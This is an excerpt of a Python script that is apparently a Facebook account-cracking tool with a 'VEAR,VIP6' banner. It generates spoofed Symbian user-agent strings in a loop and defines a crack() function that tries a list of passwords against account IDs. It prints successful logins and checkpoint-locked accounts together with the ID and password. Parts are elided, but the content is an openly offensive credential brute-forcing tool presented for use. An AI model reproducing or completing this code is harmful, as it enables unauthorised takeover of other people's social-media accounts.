...
for xd in range(10000):
	a='Mozilla/6.0 (Symbian/3; Series60/'
...
\x1b[38;5;46m______________________________________________________
 ...
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m LORD : 🔥VEAR,VIP6🔥
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m GITHUB: 🔥VEAR,.🔥 
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m CRACK    :  FB😓🔥🦅
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [VEAR,VIP6] {h}{loop}|{len(id)} | {h}{ok} ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r \x1b[1;91m[VEAR,VIP6-CP] {idf} | {pw}')     
				...
				#print ()
				print(f'\r\r\x1b[38;5;46m[VEAR,VIP6-OK💉] '+idf+ ' | '+pw+'')
